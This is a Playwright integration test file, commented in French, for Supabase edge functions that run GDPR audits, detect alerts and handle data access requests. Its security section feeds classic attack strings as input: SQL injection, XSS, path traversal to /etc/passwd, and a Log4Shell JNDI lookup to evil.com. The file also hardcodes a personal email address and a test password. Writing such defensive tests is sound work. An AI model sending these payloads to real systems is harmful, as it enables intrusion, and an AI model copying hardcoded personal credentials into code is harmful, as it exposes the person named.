import { test, expect } from '@playwright/test';
import { createClient } from '@supabase/supabase-js';

// Configuration Supabase pour les tests
const SUPABASE_URL = process.env.VITE_SUPABASE_URL || 'https://yaincoxihiqdksxgrsrk.supabase.co';
const SUPABASE_ANON_KEY = process.env.VITE_SUPABASE_PUBLISHABLE_KEY || '';

const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

test.describe('Edge Functions RGPD - Tests d\'intégration', () => {
  let testUser: any;
  let authToken: string;

  test.beforeAll(async () => {
    // Créer un utilisateur de test ou utiliser un existant
    const { data, error } = await supabase.auth.signInWithPassword({
      email: 'm.laeticia@hotmail.fr',
      password: 'test-password-123', // À adapter
    });

    if (error) {
      console.warn('Auth non disponible pour tests, utilisation mode public:', error.message);
    } else {
      testUser = data.user;
      authToken = data.session?.access_token || '';
    }
  });

  test.afterAll(async () => {
    // Nettoyer
    if (testUser) {
      await supabase.auth.signOut();
    }
  });

  // ============================================================================
  // Tests: compliance-audit Edge Functions
  // ============================================================================

  test.describe('compliance-audit/* - Audit de conformité', () => {
    test('compliance-audit/latest - Récupère le dernier audit', async () => {
      const { data, error } = await supabase.functions.invoke('compliance-audit/latest', {
        headers: authToken ? { Authorization: `Bearer ${authToken}` } : {},
      });

      // Vérifier qu'il n'y a pas d'erreur critique
      if (error) {
        console.warn('Erreur compliance-audit/latest:', error);
        // On accepte une erreur si aucun audit n'existe encore
        expect(error.message).toMatch(/no audit found|not found/i);
      } else {
        // Si succès, vérifier la structure
        expect(data).toHaveProperty('audit');
        expect(data.audit).toHaveProperty('overall_score');
        expect(data).toHaveProperty('categories');
        expect(Array.isArray(data.categories)).toBe(true);
      }
    });

    test('compliance-audit/history - Récupère l\'historique des audits', async () => {
      const { data, error } = await supabase.functions.invoke('compliance-audit/history', {
        headers: authToken ? { Authorization: `Bearer ${authToken}` } : {},
      });

      if (error) {
        console.warn('Erreur compliance-audit/history:', error);
      } else {
        expect(data).toHaveProperty('audits');
        expect(Array.isArray(data.audits)).toBe(true);
      }
    });

    test('compliance-audit/run - Lance un nouvel audit', async () => {
      // Ce test peut prendre du temps
      test.setTimeout(60000);

      const { data, error } = await supabase.functions.invoke('compliance-audit/run', {
        headers: authToken ? { Authorization: `Bearer ${authToken}` } : {},
      });

      if (error) {
        console.warn('Erreur compliance-audit/run:', error);
        // Peut nécessiter des permissions admin
        expect(error.message).toMatch(/unauthorized|permission|admin/i);
      } else {
        expect(data).toHaveProperty('overall_score');
        expect(data.overall_score).toBeGreaterThanOrEqual(0);
        expect(data.overall_score).toBeLessThanOrEqual(100);
      }
    });

    test('compliance-audit/run - Validation des données de sortie', async () => {
      test.setTimeout(60000);

      const { data, error } = await supabase.functions.invoke('compliance-audit/run', {
        headers: authToken ? { Authorization: `Bearer ${authToken}` } : {},
      });

      if (!error && data) {
        // Valider la structure complète
        expect(data).toHaveProperty('audit_date');
        expect(data).toHaveProperty('status');
        expect(['completed', 'failed', 'running']).toContain(data.status);
        
        if (data.categories) {
          data.categories.forEach((category: any) => {
            expect(category).toHaveProperty('category_name');
            expect(category).toHaveProperty('score');
            expect(category).toHaveProperty('max_score');
            expect(category.score).toBeLessThanOrEqual(category.max_score);
          });
        }
      }
    });
  });

  // ============================================================================
  // Tests: gdpr-alert-detector Edge Function
  // ============================================================================

  test.describe('gdpr-alert-detector - Détection d\'alertes RGPD', () => {
    test('Détecte les alertes pour un export de données', async () => {
      const { data, error } = await supabase.functions.invoke('gdpr-alert-detector', {
        body: {
          type: 'export',
          userId: testUser?.id || 'test-user-id',
          metadata: {
            urgent: false,
            reason: 'Export de test pour validation',
          },
        },
        headers: authToken ? { Authorization: `Bearer ${authToken}` } : {},
      });

      if (error) {
        console.warn('Erreur gdpr-alert-detector:', error);
      } else {
        expect(data).toBeDefined();
        expect(data).toHaveProperty('alertsCreated');
        expect(typeof data.alertsCreated).toBe('number');
      }
    });

    test('Détecte les alertes pour une suppression urgente', async () => {
      const { data, error } = await supabase.functions.invoke('gdpr-alert-detector', {
        body: {
          type: 'deletion',
          userId: testUser?.id || 'test-user-id',
          metadata: {
            urgent: true,
            reason: 'Demande urgente de suppression RGPD',
          },
        },
        headers: authToken ? { Authorization: `Bearer ${authToken}` } : {},
      });

      if (error) {
        console.warn('Erreur gdpr-alert-detector (urgent):', error);
      } else {
        expect(data).toBeDefined();
        // Les alertes urgentes doivent être créées
        if (data.alertsCreated > 0) {
          expect(data.alertsCreated).toBeGreaterThan(0);
        }
      }
    });

    test('Validation des types d\'événements supportés', async () => {
      const validTypes = ['export', 'deletion', 'consent'];

      for (const type of validTypes) {
        const { error } = await supabase.functions.invoke('gdpr-alert-detector', {
          body: {
            type,
            userId: testUser?.id || 'test-user-id',
          },
          headers: authToken ? { Authorization: `Bearer ${authToken}` } : {},
        });

        // Chaque type doit être accepté
        if (error) {
          expect(error.message).not.toMatch(/invalid type|unsupported/i);
        }
      }
    });

    test('Rejette les types d\'événements invalides', async () => {
      const { error } = await supabase.functions.invoke('gdpr-alert-detector', {
        body: {
          type: 'invalid-type',
          userId: testUser?.id || 'test-user-id',
        },
        headers: authToken ? { Authorization: `Bearer ${authToken}` } : {},
      });

      expect(error).toBeDefined();
    });
  });

  // ============================================================================
  // Tests: dsar-handler Edge Function (Data Subject Access Request)
  // ============================================================================

  test.describe('dsar-handler - Gestion des demandes d\'accès aux données', () => {
    test('Crée une nouvelle demande DSAR', async () => {
      const { data, error } = await supabase.functions.invoke('dsar-handler', {
        body: {
          action: 'create',
          requestType: 'access',
          userEmail: 'm.laeticia@hotmail.fr',
          details: 'Demande d\'accès à toutes mes données personnelles',
        },
        headers: authToken ? { Authorization: `Bearer ${authToken}` } : {},
      });

      if (error) {
        console.warn('Erreur dsar-handler (create):', error);
      } else {
        expect(data).toBeDefined();
        expect(data).toHaveProperty('requestId');
        expect(data).toHaveProperty('status');
        expect(['pending', 'created', 'processing']).toContain(data.status);
      }
    });

    test('Récupère le statut d\'une demande DSAR', async () => {
      // D'abord créer une demande
      const { data: createData } = await supabase.functions.invoke('dsar-handler', {
        body: {
          action: 'create',
          requestType: 'access',
          userEmail: 'm.laeticia@hotmail.fr',
        },
        headers: authToken ? { Authorization: `Bearer ${authToken}` } : {},
      });

      if (createData?.requestId) {
        // Puis récupérer son statut
        const { data, error } = await supabase.functions.invoke('dsar-handler', {
          body: {
            action: 'status',
            requestId: createData.requestId,
          },
          headers: authToken ? { Authorization: `Bearer ${authToken}` } : {},
        });

        if (error) {
          console.warn('Erreur dsar-handler (status):', error);
        } else {
          expect(data).toBeDefined();
          expect(data).toHaveProperty('status');
          expect(data).toHaveProperty('createdAt');
        }
      }
    });

    test('Liste les demandes DSAR de l\'utilisateur', async () => {
      const { data, error } = await supabase.functions.invoke('dsar-handler', {
        body: {
          action: 'list',
          userId: testUser?.id,
        },
        headers: authToken ? { Authorization: `Bearer ${authToken}` } : {},
      });

      if (error) {
        console.warn('Erreur dsar-handler (list):', error);
      } else {
        expect(data).toBeDefined();
        expect(Array.isArray(data.requests) || Array.isArray(data)).toBe(true);
      }
    });

    test('Validation des types de requêtes DSAR supportées', async () => {
      const validRequestTypes = ['access', 'rectification', 'deletion', 'portability', 'objection', 'restriction'];

      for (const requestType of validRequestTypes) {
        const { error } = await supabase.functions.invoke('dsar-handler', {
          body: {
            action: 'create',
            requestType,
            userEmail: 'm.laeticia@hotmail.fr',
          },
          headers: authToken ? { Authorization: `Bearer ${authToken}` } : {},
        });

        // Chaque type doit être accepté
        if (error) {
          expect(error.message).not.toMatch(/invalid request type|unsupported/i);
        }
      }
    });

    test('Temps de traitement des demandes DSAR < 30 secondes', async () => {
      const startTime = Date.now();

      await supabase.functions.invoke('dsar-handler', {
        body: {
          action: 'create',
          requestType: 'access',
          userEmail: 'm.laeticia@hotmail.fr',
        },
        headers: authToken ? { Authorization: `Bearer ${authToken}` } : {},
      });

      const duration = Date.now() - startTime;
      expect(duration).toBeLessThan(30000); // 30 secondes max
    });
  });

  // ============================================================================
  // Tests: Scénarios d'intégration complets
  // ============================================================================

  test.describe('Scénarios d\'intégration RGPD complets', () => {
    test('Scénario complet: Audit → Détection alerte → Création DSAR', async () => {
      test.setTimeout(90000);

      // 1. Lancer un audit
      const { data: auditData } = await supabase.functions.invoke('compliance-audit/run', {
        headers: authToken ? { Authorization: `Bearer ${authToken}` } : {},
      });

      // 2. Déclencher une alerte si score faible
      if (auditData && auditData.overall_score < 70) {
        const { data: alertData } = await supabase.functions.invoke('gdpr-alert-detector', {
          body: {
            type: 'export',
            userId: testUser?.id || 'test-user-id',
            metadata: {
              urgent: true,
              reason: `Score de conformité faible: ${auditData.overall_score}`,
            },
          },
          headers: authToken ? { Authorization: `Bearer ${authToken}` } : {},
        });

        expect(alertData).toBeDefined();
      }

      // 3. Créer une demande DSAR pour améliorer la conformité
      const { data: dsarData } = await supabase.functions.invoke('dsar-handler', {
        body: {
          action: 'create',
          requestType: 'access',
          userEmail: 'm.laeticia@hotmail.fr',
          details: 'Demande suite à audit de conformité',
        },
        headers: authToken ? { Authorization: `Bearer ${authToken}` } : {},
      });

      expect(dsarData).toBeDefined();
    });

    test('Performance: Toutes les fonctions répondent en < 10s', async () => {
      test.setTimeout(60000);

      const functions = [
        { name: 'compliance-audit/latest', body: {} },
        { name: 'gdpr-alert-detector', body: { type: 'consent', userId: 'test' } },
        { name: 'dsar-handler', body: { action: 'list', userId: testUser?.id } },
      ];

      for (const func of functions) {
        const startTime = Date.now();

        await supabase.functions.invoke(func.name, {
          body: func.body,
          headers: authToken ? { Authorization: `Bearer ${authToken}` } : {},
        });

        const duration = Date.now() - startTime;
        console.log(`${func.name}: ${duration}ms`);
        expect(duration).toBeLessThan(10000);
      }
    });
  });

  // ============================================================================
  // Tests: Sécurité et validation
  // ============================================================================

  test.describe('Sécurité et validation des Edge Functions', () => {
    test('Les fonctions rejettent les payloads malformés', async () => {
      const { error } = await supabase.functions.invoke('gdpr-alert-detector', {
        body: {
          // Payload invalide
          invalid_field: 'test',
        },
        headers: authToken ? { Authorization: `Bearer ${authToken}` } : {},
      });

      expect(error).toBeDefined();
    });

    test('Les fonctions gèrent les valeurs null/undefined', async () => {
      const { error } = await supabase.functions.invoke('dsar-handler', {
        body: {
          action: 'create',
          requestType: null,
          userEmail: undefined,
        },
        headers: authToken ? { Authorization: `Bearer ${authToken}` } : {},
      });

      expect(error).toBeDefined();
    });

    test('Protection contre les injections dans les paramètres', async () => {
      const maliciousInputs = [
        "'; DROP TABLE users; --",
        '<script>alert("xss")</script>',
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/a}',
      ];

      for (const input of maliciousInputs) {
        const { data, error } = await supabase.functions.invoke('dsar-handler', {
          body: {
            action: 'create',
            requestType: 'access',
            userEmail: input,
          },
          headers: authToken ? { Authorization: `Bearer ${authToken}` } : {},
        });

        // La fonction doit soit rejeter l'input, soit le sanitizer
        if (!error) {
          // Si accepté, vérifier qu'il est sanitizé
          expect(data).toBeDefined();
        }
      }
    });
  });
});
